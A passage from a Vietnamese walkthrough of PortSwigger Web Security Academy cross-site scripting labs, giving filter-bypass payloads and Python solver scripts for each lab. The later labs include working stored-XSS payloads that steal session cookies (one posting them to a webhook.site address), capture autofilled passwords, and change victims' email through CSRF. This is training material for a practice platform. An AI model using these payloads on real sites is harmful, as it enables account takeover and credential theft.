đoạn code dùng ajax để xử lý dữ liệu

### Khai thác

- Như ta có thể thấy, tính năng search này trả về response JSON theo câu lệnh eval mà không qua bất kỳ filter nào vì vậy chúng ta có thể chèn vào đó các ký được đặc biệt
- mình sẽ bypass ở đoạn searchTerm ở bên trên payload đầy đủ là `\"-alert(1)}//` -> vì
  - chương trình sẽ tự động thêm, dấu `\` khi ta dùng `"` (để đóng chuỗi) nhưng lại thành 1 ký tự trong chuỗi nên đầu tiên nên mình sẽ thêm một dấu `\` vào , từ đó tạo thành 2 dấu `\\` và chúng ta vẫn dùng được `"` để kết thúc chuỗi,
  - dấu `-` để ngăn cách giữa biểu thức trước và chức năng alert của mình có thể dùng dấu công để ngăn cách lệnh nhưng dấu `+` thường bị encodeURL còn `-` thì không
  - sau đó đóng ngoặc để kết thúc JSON và `//` sẽ comment hết đoạn đằng sau, cụ thể thì responds sẽ là

![image](https://hackmd.io/_uploads/Sy1YJVPcp.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ab6003d04e984788072e44a004d005b.web-security-academy.net'

session = requests.Session()

payload = quote('\\"-alert(1)}//')

response = session.get(
    url + '/?search=' + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/r12JyVDqp.png)

## 13. Lab: Stored DOM XSS

link: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored

### Đề bài

![image](https://hackmd.io/_uploads/Sy5584P9a.png)

### Phân tích

- Lab này có chứa lỗ hổng stored DOM XSS ở chức năng bình luận, để solve lab thì mình cần khai thác lỗ hổng để sử dụng chức năng alert()

Payload đầu là: `<script>alert(1)</script>` thì trang web chỉ trả về body comment là:

![image](https://hackmd.io/_uploads/BJleT4PcT.png)

CTRL+U thấy file javascript loadcomment

![image](https://hackmd.io/_uploads/HJ5Q6EP9p.png)

```javascript
function loadComments(postCommentPath) {
  let xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function () {
    if (this.readyState == 4 && this.status == 200) {
      let comments = JSON.parse(this.responseText);
      displayComments(comments);
    }
  };
  xhr.open("GET", postCommentPath + window.location.search);
  xhr.send();

  function escapeHTML(html) {
    return html.replace("<", "&lt;").replace(">", "&gt;");
  }

  function displayComments(comments) {
    let userComments = document.getElementById("user-comments");

    for (let i = 0; i < comments.length; ++i) {
      comment = comments[i];
      let commentSection = document.createElement("section");
      commentSection.setAttribute("class", "comment");

      let firstPElement = document.createElement("p");

      let avatarImgElement = document.createElement("img");
      avatarImgElement.setAttribute("class", "avatar");
      avatarImgElement.setAttribute(
        "src",
        comment.avatar
          ? escapeHTML(comment.avatar)
          : "/resources/images/avatarDefault.svg"
      );

      if (comment.author) {
        if (comment.website) {
          let websiteElement = document.createElement("a");
          websiteElement.setAttribute("id", "author");
          websiteElement.setAttribute("href", comment.website);
          firstPElement.appendChild(websiteElement);
        }

        let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author);
        firstPElement.innerHTML = newInnerHtml;
      }

      if (comment.date) {
        let dateObj = new Date(comment.date);
        let month = "" + (dateObj.getMonth() + 1);
        let day = "" + dateObj.getDate();
        let year = dateObj.getFullYear();

        if (month.length < 2) month = "0" + month;
        if (day.length < 2) day = "0" + day;

        dateStr = [day, month, year].join("-");

        let newInnerHtml = firstPElement.innerHTML + " | " + dateStr;
        firstPElement.innerHTML = newInnerHtml;
      }

      firstPElement.appendChild(avatarImgElement);

      commentSection.appendChild(firstPElement);

      if (comment.body) {
        let commentBodyPElement = document.createElement("p");
        commentBodyPElement.innerHTML = escapeHTML(comment.body);

        commentSection.appendChild(commentBodyPElement);
      }
      commentSection.appendChild(document.createElement("p"));

      userComments.appendChild(commentSection);
    }
  }
}
```

để ý thấy `html.replace('<', '&lt;').replace('>', '&gt;');` chương trình chỉ filter `>` và `<` và sau đó tạo thẻ `<p>` chứa nội dung của chúng ta và chèn vào trang web ` commentSection.appendChild(document.createElement("p"));`

### Khai thác

- Nó encode dấu `<` và `>` nhưng nó lại không encode hết, nên phần sau của mình đã biến mất không còn dấu vết nào vì nó không được encode, chứng tỏ nó chỉ check lần xuất hiện đầu của dấu ngoặc này, nên mình sẽ để trống trong cặp ngoặc đầu và payload của mình ở cặp ngoặc sau
- `<><img src=x onerror=alert(1)>`

![image](https://hackmd.io/_uploads/SJcpgSDqa.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a2d000f0463bd5a803c08ff00c100a8.web-security-academy.net/'

session = requests.Session()
response = session.get(
    url + 'post?postId=5' ,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input' , {'name' : 'csrf'})['value']
payload = "<><img src=x onerror=alert(1)>"

data = {
    'csrf' : csrf,
    'postId' : '5',
    'comment' : payload,
    'name' : 'cuong',
    'email' : 'a@a.a',
    'website' : '',
}
response = session.post(
    url + "post/comment",
    data=data,
    verify=False,
)

response = session.get(
    url + 'post?postId=5' ,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

## 14. Lab: Reflected XSS into HTML context with most tags and attributes blocked

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

### Đề bài

![image](https://hackmd.io/_uploads/rJ7UatP56.png)

### Phân tích

- Lab này chứa lỗ hổng reflected XSS ở trong chức năng tìm kiếm nhưng trang web sử dụng firewall để bảo vệ khỏi những trường hợp XSS phổ biến, để solve được lab thì mình cần phải bypass WAF(web application firewall) và thực thi được chức năng print()
- Ứng dụng có chức năng search dính XSS nhưng đã block hầu hết các tags.

![image](https://hackmd.io/_uploads/SJzGRKDcp.png)

Ta sẽ đi bruteforce tất cả các tag để xem các tag không bị block.

mình dùng cheatsheet của portswigger để thực hiện https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

![image](https://hackmd.io/_uploads/HJH9AtvqT.png)

### Khai thác

- Search với từ khóa `<$tag$>` với Intruder.

![image](https://hackmd.io/_uploads/Skx_AFwqa.png)

![image](https://hackmd.io/_uploads/BJ4Yycvca.png)

Ta thử search `<body onload=1>` thì thấy event `onload` đã bị block.

![image](https://hackmd.io/_uploads/S1pAJ9v9a.png)

Tương tự, ta sẽ đi tìm event chưa bị block bằng cách bruteforce.

![image](https://hackmd.io/_uploads/rJd4x9Pca.png)

Kết quả trả về có 5 event có thể sử dụng được.

![image](https://hackmd.io/_uploads/BkzXbqvqT.png)

Và để trigger XSS mà không cần thao tác người dùng, ta sử dụng `<iframe>` nhằm load body của trang với size khác để kích hoạt onresize:

mình dùng payload

```javascript
<iframe src="https://0a6a006e03d0f6b984b67c160034009f.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" onload=this.style.width='150px'>
```

![image](https://hackmd.io/_uploads/By7Dbqvca.png)

store và gửi cho victim, Ta solve được challenge khi hàm print() đã được gọi.

![image](https://hackmd.io/_uploads/HJYDb5P5p.png)

## 15. Lab: Reflected XSS into HTML context with all tags blocked except custom ones

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

### Đề bài

![image](https://hackmd.io/_uploads/SyN0ZqPcT.png)

### Phân tích

- Lab này chặn tất cả các HTML tags ngoại trừ tag custom
- Để solve lab thì mình cần thực hiện XSS để truyền vào một custom tag với việc tự động alert ra `document.cookie`

### Khai thác

Ở đây mình sử dụng tag `<xss>` với payload: `<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>`

![image](https://hackmd.io/_uploads/By4KEcP9T.png)

Tiếp đến là làm như thế nào để victim bị, thì em đã nghĩ đến việc điều hướng của thẻ script, sử dụng `window.location` để trang web điều hướng sang payload:

```javascript
<script>window.location.href="https://0ab7004a047ddc3980fc3fac00a400d6.web-security-academy.net/?search=<xss+autofocus+tabindex=1++onfocus=alert(document.cookie)></xss>"</script>
```

![image](https://hackmd.io/_uploads/Hyq5Uqwcp.png)

## 16. Lab: Reflected XSS with some SVG markup allowed

link: https://hackmd.io/QaN2GuaUQz2-1QtfPI9Grw?both

### Đề bài

![image](https://hackmd.io/_uploads/H1RXDcPqT.png)

### Phân tích

- Lab này chứa lỗ hổng reflected XSS, nó chặn các tag phổ biến nhưng quên mất vài SVG tags và events. Để solve lab, thực hiện chức năng alert()

### Khai thác

- Dùng Intruder với wordlist tag cho trước để tìm xem các tag nào không bị filter.
- Kết quả trả về có 4 tag không bị block là `image, svg, title, animatetransform`

![image](https://hackmd.io/_uploads/r1-0o9P56.png)

- Như vậy, ta có thể sử dụng tag animatetransform trong tag svg. Ta tiếp tục dùng Intruder để xem event nào không bị block.
- Kết quả chỉ có `onbegin` không bị filter.
- Sử dụng nó với payload `<svg><animatetransform onbegin=alert(1)>`, ta solve được challenge.

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a67009e03ddde64805fd044001b0079.h1-web-security-academy.net'

payload= "<svg><animatetransform onbegin=alert(1)>"
response = requests.get(
    url + '/?search=' + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rJ7hKqw9T.png)

## 17. Lab: Reflected XSS in canonical link tag

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

### Đề bài

![image](https://hackmd.io/_uploads/rJngR5wq6.png)

### Phân tích

- Lab trên sẽ trả về dữ liệu đầu vào của user bên trong một canonical link và sẽ loại bỏ dấu `<>`, để solve lab mình cần thực hiện XSS ở trang home sao cho thực hiện được chức năng alert.

mình đi tìm hiểu canonical link

![image](https://hackmd.io/_uploads/BJ8_1sD5a.png)

Khi truy cập trang web, có thể thấy canonical link chính là đường dẫn URL hiện tại. Nhìn vào đó mình có thể escape và thêm thuộc tính để reflected XSS.

![image](https://hackmd.io/_uploads/H1nWyoP56.png)

### Khai thác

- sử dấu `?` để lừa truyền vào tham số,vì nếu em chỉ thêm dấu `?` rồi ngắt chuỗi href

`?'accesskey='x'onclick='alert(1)` và gửi payload.

- Dấu `'` đầu tiên sau dấu ? là để ngắt đoạn href vì ta để ý thấy đoạn href sử dụng dấu `'`
- Sau đó chèn vào thuộc tính `accesskey=‘X’` như bài viết trên để khi bấm ALT+SHIFT+X thì sẽ thực hiện onclick='alert(1), và kết thúc bằng dấu `'` có sẵn của thuộc tính href

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a24001d042c8f908303f16700b5001d.web-security-academy.net/'

payload= "?'accesskey='x'onclick='alert(1)"
response = requests.get(
    url  + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/HJ-FWiv9p.png)

![image](https://hackmd.io/_uploads/r1GvZoDca.png)

## 18. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

### Đề bài

![image](https://hackmd.io/_uploads/ryz7MiP9T.png)

### Phân tích

- Chuỗi user search được lưu vào biến searchTerms.
- `'` đã bị escape.

![image](https://hackmd.io/_uploads/ryV811O9T.png)

### Khai thác

- Tuy nhiên, ta thử thêm </script> để đóng tag script rồi thêm XSS
- Vậy payload của ta giờ sẽ là: `</script><img src=1 onerror=alert(document.domain)>`

mình đã viết lại scrip khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a80004d0360deeb8028fdfb00b40096.web-security-academy.net'

payload= "</script><img src=1 onerror=alert(document.domain)>"
response = requests.get(
    url  + "/?search=" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/Bkre1yd5p.png)

## 19. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped

### Đề bài

![image](https://hackmd.io/_uploads/BJOvFCDc6.png)

### Phân tích

- Lab này chứa lỗ hổng reflected XSS ở chức năng tìm kiếm khi mà dấu` <> ""` đã bị HTML encode và dấu `''` đã bị escaped. Để solve lab thì em cần thoát khỏi js string và thực hiện chức năng alert
  Trang web có chức năng search, và khi search thì chức năng js sẽ xuất hiện, cụ thể đoạn code js là:

```javascript
 <script>
        var searchTerms = '123';
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

mình search

![image](https://hackmd.io/_uploads/S1i64iwq6.png)

trang web đã thêm dấu \ đằng trước để khi kết hợp \' js sẽ hiểu đây là ký tự ' ở trong chuỗi

### Khai thác

với 1 dấu \ và trang web cho ta thêm 1 dấu nữa, nó sẽ tạo thành \\ và js sẽ hiểu là ta muốn nối chuỗi thêm dấu \ vào bên trong chuỗi, từ đó dấu ' của ta sẽ không được coi là ký tự đặc biệt cần nối nữa mà ta có thể đóng được chuỗi rồi

Vậy payload của ta giờ sẽ là: `\'-alert(1)//`

mình đã viết lại scrip khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a80004d0360deeb8028fdfb00b40096.web-security-academy.net'

payload= "\\'-alert(1)//"
response = requests.get(
    url  + "/?search=" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B16UjRP9T.png)

## 20. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

### Đề bài

![image](https://hackmd.io/_uploads/HkO70awqa.png)

### Phân tích

- Lab trên chứa lỗ hổng stored XSS ở chức năng bình luận, để solve lab trên thì mình cần bình luận mà thực hiện được chức năng alert khi mà ấn vào tên của tác giả bình luận

![image](https://hackmd.io/_uploads/HyOqkCD5p.png)

- Load lai trang chứa comment có thể thấy, trường website được truyền thẳng vào hàm track() trong event onclick tại tag `<a>` chứa tên người dùng.

- mình thử comment với website là `http://a.com"\'><` thì thấy các kí tự `"\'><` đều bị HTML encode cũng như escape.

### Khai thác

- Nhìn vào hàm track() ta có thể sử dụng payload sau `http://a.com'-alert(1)-'` để thoát ra khỏi chuỗi và gọi được alert nhờ expression. Tuy nhiên vì `'` đã bị escape nên ta sẽ encode thử `'` thành &apos; xem.
- vì trước khi xử lý js thì browser sẽ tự HTML decode giá trị của thuộc tính onclick

payload ở phần website sẽ là
`http://a.com&apos;-alert(1)-&apos;`

![image](https://hackmd.io/_uploads/r1GsbRDc6.png)

mình đã vieetrs lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0af4007f03b1d787809f94f600df006d.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name' : 'csrf'})['value']
payload = "http://a.com&apos;-alert(1)-&apos;"
data = {
    'comment': "<script>alert('XSS')</script>",
    'postId': '8',
    'name': 'cuong',
    'email': 'a@a.a',
    'website' : payload,
    'csrf' : csrf,
}

response = session.post(
    url + "/post/comment",
    data=data,
    verify=False,
)

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/r1caz0Pqp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rJI8MAw56.png)

## 21. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

link: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

### Đề bài

![image](https://hackmd.io/_uploads/r1-lN0vqa.png)

### Phân tích

- Lab trên chứa lỗ hổng reflected XSS ở chức năng search, nó hiện dữ liệu của người dùng đưa cho ở trong một template string với dấu `<> '' ""` đều bị HTML encode, và cả dấu \`\` bị escape. Để solve lab thì mình cần thực hiện khai thác lỗ hổng XSS để gọi chức năng alert ở trong template string này

![image](https://hackmd.io/_uploads/BJTPrAPcT.png)

```javascript
<script>
  var message = `0 search results for
  '\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e'`;
  document.getElementById('searchMessage').innerText = message;
</script>
```

- Bài sử dụng template literal trong dấu backticks \`\` để hiển thị chuỗi search ở biến message. Các kí tự `'<>"/` đều bị Unicode encode.\

### Khai thác

- Ta sẽ dùng `${}` syntax để thực thi JS expression trong dấu backticks \`\` của template mà không cần phải terminate khỏi nó. Ví dụ, search với chuỗi `${1+1}`:

![image](https://hackmd.io/_uploads/rJvWIAwc6.png)

![image](https://hackmd.io/_uploads/HkOMU0v96.png)

- Có thể thấy `${1+1}` đã được thực thi và trả về 2.

mình sẽ dùng payload `${alert(1)}` để giải quyết lab này

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a0c000d04822c9f8baeadb200d50045.web-security-academy.net'

payload= "${alert(1)}"
response = requests.get(
    url  + "/?search=" + payload,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SkhpUAw5T.png)

mục đíc của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/ryr-DRvcT.png)

## 22. Lab: Exploiting cross-site scripting to steal cookies

link: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

### Đề bài

![image](https://hackmd.io/_uploads/SyCDxJ_c6.png)

### Phân tích

- Lab này chứa lỗ hổng stored XSS ở chức năng comment. Nạn nhân sẽ xem tất cả comment được đăng lên, để solve lab thì em cần khai thác lỗ hổng nhắm chiếm được session cookie của nạn nhân, và dùng nó để đóng giả làm nạn nhân
- Tương tự các bài trên, chức năng comment bị dính Stored XSS. Kiểm tra với trường comment với `<script>alert(1)</script>` thì thấy attack thành công.
- ![image](https://hackmd.io/_uploads/B1eQoddq6.png)

tiếp theo chúng ta cần tạo 1 payload để lấy được cookie của nạn nhân và hiển thị nó ra

### Khai thác

mình dùng payload này chuyền vào comment

```javascript
<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 6);
data.append('comment', document.cookie);
data.append('name', 'cuong');
data.append('email', 'a@a.a')
data.append('website', 'http://a.com')

fetch('/post/comment',{
  method: 'POST',
  mode: 'no-cors',
  body : data,
});
});
</script>
```

mình thấy có lab trả về session trên comment

![image](https://hackmd.io/_uploads/By3Hnw_ca.png)

- Truy cập `/my-account` với cookie vừa lấy được, ta thấy đó là `administrator`.

![image](https://hackmd.io/_uploads/HkdeAPd56.png)

- phòng thí nghiệm là mô phỏng vậy nên khi chúng ta gửi payload này, phòng thí nghiệm sẽ giả vờ làm nạn nhân truy cập vào trang này và sẽ post 1 comment kèm cookie của họ cho chúng ta thấy nó tương tự như cuộc tấn công CSRF

vậy là mình solve được lab này

mình dùng webhook(https://webhook.site/) để lấy cookie trả về vẫn được cookie

mình dùng payload sau để chèn vào phần comment

```javascript
<script>
fetch('https://webhook.site/c161ef63-a9e1-4670-99e0-c9140344af84', {
method: 'POST',
body:document.cookie
});
</script>
```

vào webhook và và bắt được requet POST mà lab gửi đến có session bên trong cookie là `session=pafcv6D9PCmMuBEFbdnYjCkjOvBvucaf`

![image](https://hackmd.io/_uploads/rkPgVwu5a.png)

nhưng lab có chú ý

![image](https://hackmd.io/_uploads/S1S6suO9T.png)

- Để ngăn nền tảng Học viện bị sử dụng để tấn công các bên thứ ba, tường lửa của chúng tôi chặn các tương tác giữa các phòng thí nghiệm và các hệ thống bên ngoài tùy ý. Để giải quyết bài lab, bạn phải sử dụng máy chủ công cộng mặc định của Burp Collaborator
- vậy nên session bên trên trả về cho chúng ta là không chính xác

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a1a006a048ab74b839e9cce000f00d4.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name' : 'csrf'})['value']

payload = """<script>
window.addEventListener('DOMContentLoaded', function(){
var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', document.cookie);
data.append('name', 'cuong');
data.append('email', 'a@a.a')
data.append('website', 'http://a.com')

fetch('/post/comment',{
  method: 'POST',
  mode: 'no-cors',
  body : data,
});
});
</script>""";

data = {
    'comment': payload,
    'postId': '8',
    'name': 'cuong',
    'email': 'a@a.a',
    'website' : 'http://a.com',
    'csrf' : csrf,
}

response = session.post(
    url + "/post/comment",
    data=data,
    verify=False,
)

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

pattern = 'secret='+r'\b\w{32}\b'+'; ' + 'session=' +r'\b\w{32}\b'
match = re.search(pattern, response.text).group()
session_data = match.split(';')[1].split('=')[1]
cookies = {
    'session' : session_data,
}
response = session.get(
    url + "/my-account",
    cookies= cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/HJ_IYu_9T.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SkXF3POqa.png)

## 23. Lab: Exploiting cross-site scripting to capture passwords

link: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

### Đề bài

![image](https://hackmd.io/_uploads/ByOrEFd9p.png)

### Phân tích

- Lab trên chứa lỗ hổng stored XSS ở chức năng bình luận, nạn nhân sẽ xem tất cả comment được đăng, để solve lab này thì mình cần khai thác lỗ hổng để lấy username và password của nạn nhân và lấy nó để đăng nhập vào tài khoản của nạn nhân
- Tương tự các bài trên, chức năng comment bị dính Stored XSS. Kiểm tra với trường comment với `<script>alert(1)</script>` thì thấy attack thành công.
- ![image](https://hackmd.io/_uploads/rkoNSYu9p.png)

- Có phải các bạn đã từng gặp tình huống sau khi đăng nhập tài khoản ở một trang web nào đó và trình duyệt đã gợi ý việc lưu trữ mật khẩu?
- ![image](https://hackmd.io/_uploads/Syl-pCd9a.png)
- Tính năng lưu trữ mật khẩu không chỉ giúp ích cho chúng ta tìm lại mật khẩu trong trường hợp bị quên sau thời gian dài, mà còn giúp chúng ta tự động điền (autofill) tài khoản ở các lần đăng nhập sau:
- Chức năng hữu ích này đã gián tiếp giúp kẻ tấn công có thể lợi dụng lỗ hổng XSS nhằm đánh cắp mật khẩu ở chế độ autofill trên trình duyệt của nạn nhân. Chẳng hạn, kẻ tấn công có thể lợi dụng XSS tạo một form login giả trên trang web với script
- Kết quả sau khi comment, với lỗ hổng Stored XSS sẽ luôn hiển thị form giả này tới mỗi nạn nhân truy cập bài viết chứa script
- Với chức năng auto-fill password sẽ giúp kẻ tấn công thu thập username và password đã lưu của nạn nhân và gửi chúng tới `https://attacker.com/capture` bằng XMLHttpRequest(). Hậu quả của dạng tấn công này nếu thành công sẽ lớn hơn so với việc chỉ đánh cắp được cookie nạn nhân do kẻ tấn công có thể thực hiện việc giả mạo bất cứ lúc nào (trong trường hợp không có xác thực 2FA). Ngoài ra nạn nhân còn có thể bị đánh cắp tài khoản ở các nền tảng khác do người dùng thường lưu trữ các tài khoản khác nhau với chung một mật khẩu!

### Khai thác

- Như PortSwigger đã hướng dẫn, payload sẽ dựa vào việc tạo ra input giả để người dùng sử dụng password autofill để nhập vào, sau đó lấy giá trị của nó để gửi về

mình dùng payload này chuyền vào comment

```javascript
<input type="text" name="username"></input>
<input type="password" name="password" onchange="hax()"></input>
<script>
function hax(){
var token = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', `${username}:${password}`);
data.append('name', 'cuong');
data.append('email', 'a@a.a')
data.append('website', 'http://a.com')

fetch('/post/comment',{
  method: 'POST',
  mode: 'no-cors',
  body : data,
});
}
</script>
```

![image](https://hackmd.io/_uploads/SJXHwF_qa.png)

mình thấy có lab trả về tài khoản ==administrator:eqg22me7g5ihuvl4weft== trên comment

![image](https://hackmd.io/_uploads/r1lUPtu96.png)

đăng nhập với tài khoản này và mình đã solve được lab

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a8b005304448e7c800a0334006900ea.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name' : 'csrf'})['value']

payload = """<input type="text" name="username"></input>
<input type="password" name="password" onchange="hax()"></input>
<script>
function hax(){
var token = document.getElementsByName('csrf')[0].value;
var username = document.getElementsByName('username')[0].value;
var password = document.getElementsByName('password')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 8);
data.append('comment', `${username}:${password}`);
data.append('name', 'cuong');
data.append('email', 'a@a.a')
data.append('website', 'http://a.com')

fetch('/post/comment',{
  method: 'POST',
  mode: 'no-cors',
  body : data,
});
}
</script>""";

data = {
    'comment': payload,
    'postId': '8',
    'name': 'cuong',
    'email': 'a@a.a',
    'website' : 'http://a.com',
    'csrf' : csrf,
}

response = session.post(
    url + "/post/comment",
    data=data,
    verify=False,
)

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

pattern = 'administrator:'+r'\b\w{20}\b'
match = re.search(pattern, response.text).group()
username = match.split(':')[0]
password = match.split(':')[1]

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input', {'name' : 'csrf'})['value']
data={
    'username' : username,
    'password' : password,
    'csrf' : csrf
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/H1NRtYuqa.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được lab này

![image](https://hackmd.io/_uploads/S1kNqtd9T.png)

## 24. Lab: Exploiting XSS to perform CSRF

link: https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

### Đề bài

![image](https://hackmd.io/_uploads/r1cDiFd5p.png)

### Phân tích

- Trang web này có chứa lỗi stored XSS ở chức năng comment, để solve lab mình cần khai thác lỗ hổng để thực hiện tấn công CSRF nhằm đổi email của người xem blog post đó
- Tương tự các bài trên, chức năng comment bị dính Stored XSS. Kiểm tra với trường comment với `<script>alert(1)</script>` thì thấy attack thành công.
- ![image](https://hackmd.io/_uploads/By_g3Y_9p.png)

- Đầu tiên, đăng nhập tài khoản có sẵn wiener:peter để xem form update email. GET đến /my-account, form update email gồm 2 trường email và csrf (sẽ được tạo sẵn sau khi load form).

![image](https://hackmd.io/_uploads/r1qunF_ca.png)

Khi thực hiện điền form và update email, sẽ có 1 POST request đến /my-account/change-email với email và csrf tương ứng.

### Khai thác

- ta thực hiện tạo payload như sau:

```javascript
<script>
var request = new XMLHttpRequest();
request.onload = csrfEmail;
request.open('get','/my-account',true);
request.send();
function csrfEmail() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('POST', '/my-account/change-email', true);
    changeReq.send('email=cuong@gmail.com&csrf='+token)
};
</script>
```

Cụ thể, nó sẽ GET `/my-account` trước để tự đông lấy mã csrf rồi POST đến `/my-account/change-email` kèm theo email mong muốn đổi và mã csrf đã lấy được. Như vậy, khi nạn nhân load comment này thì email của họ sẽ tự động bị đổi.

- thực chất chúng ta dựa vào thực thi XSS để khai thác CSRF khi victim đã đăng nhập và vẫn đang trong session

![image](https://hackmd.io/_uploads/SyCJx5Oq6.png)

và mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a0600d2033a68968190a7c400000021.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + "/post?postId=8",
    verify=False,
)

